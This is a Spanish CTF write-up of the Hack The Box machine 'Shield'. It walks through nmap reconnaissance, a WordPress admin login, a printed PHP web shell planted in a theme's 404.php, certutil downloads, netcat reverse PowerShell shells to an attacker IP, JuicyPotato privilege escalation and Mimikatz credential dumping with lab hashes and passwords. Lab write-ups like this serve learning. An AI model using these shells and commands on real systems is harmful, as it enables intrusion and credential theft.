# SHIELD

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -oG allPorts 10.10.10.29
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Mon Jun 14 22:58:43 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -oG allPorts 10.10.10.29
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.29 ()	Status: Up
Host: 10.10.10.29 ()	Ports: 80/open/tcp//http///, 3306/open/tcp//mysql///	Ignored State: filtered (65533)
# Nmap done at Mon Jun 14 22:59:10 2021 -- 1 IP address (1 host up) scanned in 26.51 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p80,3306 -oN targeted 10.10.10.29
```

```bash
File: targeted

# Nmap 7.91 scan initiated Mon Jun 14 23:01:44 2021 as: nmap -sC -sV -p80,3306 -oN targeted 10.10.10.29
Nmap scan report for 10.10.10.29
Host is up (0.037s latency).


PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 14 23:01:52 2021 -- 1 IP address (1 host up) scanned in 7.90 seconds
```

<br>

Como vemos, solo hay dos puertos abiertos en nuestra máquina víctima. Por un lado tenemos el puerto 80 (HTTP) y por el otro tenemos el puerto 3306 (MySQL).

<br>

### Servidor web
Comenzaremos por el puerto 80. Lo primero que haremos será un reconocimiento rápido de la web, con este reconocimiento podremos comprobar si la web corre bajo algún servidor específico o si corre bajo algún CMS (Content Management System). Para ello usaremos la herramienta [WhatWeb](https://github.com/urbanadventurer/WhatWeb):

```bash
whatweb 10.10.10.29
```

```bash
http://10.10.10.29 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.29], Microsoft-IIS[10.0], Title[IIS Windows Server]
```

Podemos ver que estamos ante un Microsoft IIS, esto nos indicará que la máquina a la que nos estamos enfrentando es una máquina Windows.

Lo siguiente que haremos será inspeccionar la web para ver ante que nos encontramos:

<img src="https://i.imgur.com/Euvie6k.png" width=700>

Como vemos, nos encontraremos con la página por defecto de Microsoft IIS por lo que tendremos que fuzzear para descubrir distintos directorios dentro del servidor web.

<br>

En primer lugar y usando el script http-enum de [nmap](https://github.com/nmap/nmap) (usa un diccionario con las 1000 rutas más frecuentes en servidores web) escanearemos el servidor web:

```bash
nmap --script http-enum -p80 -oN webScan 10.10.10.29
```

```bash
File: webScan

# Nmap 7.91 scan initiated Mon Jun 14 23:02:06 2021 as: nmap --script http-enum -p80 -oN webScan 10.10.10.29
Nmap scan report for 10.10.10.29
Host is up (0.038s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.


# Nmap done at Mon Jun 14 23:03:54 2021 -- 1 IP address (1 host up) scanned in 108.39 seconds
```

Este script nos ha descubierto dos rutas potenciales en el servidor web. Estas dos rutas son /wordpress y /wordpress/wp-login.php, por lo tanto, podremos intuir que estamos ante el CMS (Content Management System) Wordpress. La primera de las rutas nos indicará la ruta raíz del blog wordpress y la segunda de ellas el panel de login para administrarlo.

<br>

Como tenemos un panel de login y sabemos que esta máquina esta relacionada de algún modo con la máquina Vaccine, probaremos a usar las credenciales de acceso a PostgreSQL que teníamos en esa máquina. Estas son:

```plaintext
File: wpCred

admin:P@s5w0rd!
```

Por tanto, nos dirigiremos a http://10.10.10.29/wordpress/wp-login.php e introduciremos las credenciales. Podemos ver que son correctas.

<br>

## Shell de usuario

### Wordpress Plugin Shell
Una vez estamos en el panel de control de Wordpress nos dirigiremos a la sección de apariencia y después al editor de temas:

<img src="https://i.imgur.com/QFSCp2u.png" width=200>

Una vez dentro del editor de temas, elegiremos uno de los temas incluidos y modificaremos su página 404.php. Esta página, será la que se muestre cuando intentemos acceder a un recurso del tema que no exista:

<img src="https://i.imgur.com/9THIgF8.png" width=300>

Usaremos la plugin-shell.php de [SecLists](https://github.com/danielmiessler/SecLists). Ésta es una web-shell que nos permitirá ejecutar comandos mediante un argumento PHP, en este caso "cmd":

```php
File: plugin-shell.php

<?php

$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");


$cmd = 'cmd';


if(isset($_REQUEST[$cmd])) {
    $command = $_REQUEST[$cmd];
    executeCommand($command);
} else if(isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
    $ip = $_REQUEST[$ip];
    $port = '443';
    if(isset($_REQUEST[$ip])){
        $port = $_REQUEST[$port];
    }
    $sock = fsockopen($ip,$port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
    executeCommand($command);       
}
die();


function executeCommand(string $command) {
    if (class_exists('ReflectionFunction')) {
       $function = new ReflectionFunction('system');
       $function->invoke($command);
    } elseif (function_exists('call_user_func_array')) {
       call_user_func_array('system', array($command));
    } elseif (function_exists('call_user_func')) {
       call_user_func('system', $command);
    } else if(function_exists('passthru')) {
       ob_start();
       passthru($command , $return_var);
       $output = ob_get_contents();
       ob_end_clean();
    } else if(function_exists('system')){
       system($command);
    }
}
```

Lo primero que haremos será probar si el script en PHP que acabamos de subir funciona. Para ello:

```http
http://10.10.10.29/wordpress/wp-content/themes/twentynineteen/404.php?cmd=whoami
```

```plaintext
nt authority\iusr
```

Como vemos, nos dice que somos el usuario iusr, el usuario que corre el servidor Windows IIS.

<br>

### Reverse Shell
Para trabajar más cómodos, intentaremos crear una reverse shell. Para ello, lo primero que haremos será descargarnos el binario de [Netcat](http://netcat.sourceforge.net/) para Windows, pero antes comprobaremos la version de Windows bajo la que corre el servidor web. Para ello ejecutaremos el comando systeminfo:

```http
http://.../404.php?cmd=systeminfo
```

```plaintext
Host Name: SHIELD


OS Name: Microsoft Windows Server 2016 Standard


OS Version: 10.0.14393 N/A Build 14393


System Type: x64-based PC
```

Entre otras información nos reportará la versión de Windows y la arquitectura del sistema, que como vemos es de 64 bits.

Procederemos a descargarnos el binario de [Netcat](http://netcat.sourceforge.net/), específicamente la versión para 64 bits.

A continuación, nos dirigiremos al directorio en el que hayamos descargado [Netcat](http://netcat.sourceforge.net/). En este directorio, crearemos un servidor HTTP con [Python3](https://www.python.org/downloads/) que nos permitirá descargar el archivo en la máquina víctima:

```bash
python -m http.server 80
```

Después, en el navegador, usaremos la utilidad certutil.exe (instalada por defecto en Windows) y nos descargaremos el binario que estamos compartiendo. Para ello:

```http
http://.../404.php?cmd=certutil.exe -f -split -urlcache http://10.10.14.254/nc.exe
```

```plaintext
**** Online ****


0000 ...


8eb0


CertUtil: -URLCache command completed successfully.
```

Una vez descargado el binario de [Netcat](http://netcat.sourceforge.net/) en la máquina víctima procederemos a ponernos en escucha para recibir la reverse-shell. En este caso usaremos [rlwrap](https://github.com/hanslub42/rlwrap), ya que nos permitirá simular una consola interactiva en entornos Windows:

```bash
rlwrap nc -nvlp 443
```

Lo siguiente será enviarnos una reverse powershell con netcat desde el navegador, para ello:

```http
http://.../404.php?cmd=nc.exe -e powershell.exe 10.10.14.254 443
```

En este punto recibiremos una powershell como el usuario iusr. Como no tenemos flag de usuario procederemos a escalar privilegios.

<br>

## Shell de administrador

### Enumeración
Lo primero que haremos será comprobar los privilegio del usuario iusr. Para ello:

```powershell
whoami /priv
```

```plaintext
PRIVILEGES INFORMATION
----------------------


Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Podremos ver que tenemos un privilegio bastante interesante, este privilegio es el SeImpersonatePrivilege. Este privilegio nos permite ejecutar comandos como el usuario administrador mediante [Juicy-Potato](https://github.com/ohpe/juicy-potato). En este caso estamos bajo un servidor con la versión Windows Server 2016 Standard, la cual es vulnerable a este exploit.

<br>

### Juicy Potato
Para abusar de este privilegio lo primero que haremos será descargar el binario de [Juicy-Potato](https://github.com/ohpe/juicy-potato). Después, lo transferiremos a la máquina víctima de la misma forma que hemos hecho antes:

```powershell
certutil.exe -f -split -urlcache http://10.10.14.254/JuicyPotato.exe jp.exe
```

```plaintext
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
```

Una vez transferido el binario de [Juicy-Potato](https://github.com/ohpe/juicy-potato), procederemos a crear el script que va a ejecutar este. Este script será un pequeño bat que invocará el binario de [Netcat](http://netcat.sourceforge.net/) y nos devolverá una reverse powershell como administrador:

```powershell
File: shell.bat

START C:\inetpub\wwwroot\wordpress\wp-content\themes\twentynineteen\nc.exe -e powershell.exe 10.10.14.254 1234
```

Transferiremos este script a la máquina víctima:

```powershell
certutil.exe -f -split -urlcache http://10.10.14.254/shell.bat
```

Por último, en nuestra máquina nos pondremos en escucha con [Netcat](http://netcat.sourceforge.net/) por el puerto 1234, para ello:

```bash
rlwrap nc -nlvp 1234
```

Una vez tengamos todas las herramientas necesarias en la máquina víctima procederemos a ejecutar [Juicy-Potato](https://github.com/ohpe/juicy-potato). Tendremos que indicar distintos parámetros, entre ellos el programa que queremos que se lance como administrador y el CLSID que usaremos para ello.

En la primera ejecución probaremos con el CLSID por defecto por lo que omitiremos el parámetro -c:

```powershell
./js.exe -t * -l 6666 -p shell.bat
```

Esto nos devolverá el siguiente error que significa que el CLSID no es válido:

```plaintext
COM -> recv failed with error: 10038
```

Probaremos a usar un CLSID distinto, para ello en el mismo repositorio de [Juicy-Potato](https://github.com/ohpe/juicy-potato) accederemos a la lista de CLSIDs que corresponden con nuestra versión de Windows:

<img src="https://i.imgur.com/NFZM7v2.png" width=700>

En este caso probaré con el CLSID del servicio wpnservice:

```powershell
./js.exe -t * -l 6666 -p shell.bat -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
```

Lo que nos devolverá:

```plaintext
Testing {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 6666
......
[+] authresult 0
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM


[+] CreateProcessWithTokenW OK
```

Esto significa que hemos podido abusar del privilegio SeImpersonatePrivilege, por lo que recibiremos una powershell como el usuario administrador:

```powershell
whoami
```

```plaintext
nt authority\system
```

La flag root.txt la tendremos en el directorio C:\Users\Administrator\Desktop\.

<br>

## Post Explotación

### Mimikatz
Ya que estamos ante una serie de máquinas que están relacionadas entre sí, intentaremos extraer credenciales de la máquina en la que nos encontramos.

Para ello, nos transferiremos el [Mimikatz](https://github.com/gentilkiwi/mimikatz), un binario que nos permitirá leer credenciales de acceso de la memoria del dispositivo:

```powershell
certutil.exe -f -split -urlcache http://10.10.14.254/mimi.exe
```

Una vez ejecutado el binario en la máquina víctima, procederemos a extraer las contraseñas de inicio de sesión del dispositivo, para ello:

```plaintext
mimikatz # sekurlsa::logonpasswords
```

```plaintext
Authentication Id : 0 ; 620124 (00000000:0009765c)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 7/20/2021 5:14:46 PM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
	msv :	
	 [00000003] Primary
	 * Username : sandra
	 * Domain   : MEGACORP
	 * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
	 * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
	 * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
	tspkg :	
	wdigest :	
	 * Username : sandra
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : sandra
	 * Domain   : MEGACORP.LOCAL
	 * Password : Password1234!
	ssp :	
	credman :	
```

Como vemos, hemos podido extraer las siguientes credenciales:

```plaintext
File: mimiCreds

sandra:Password1234!
```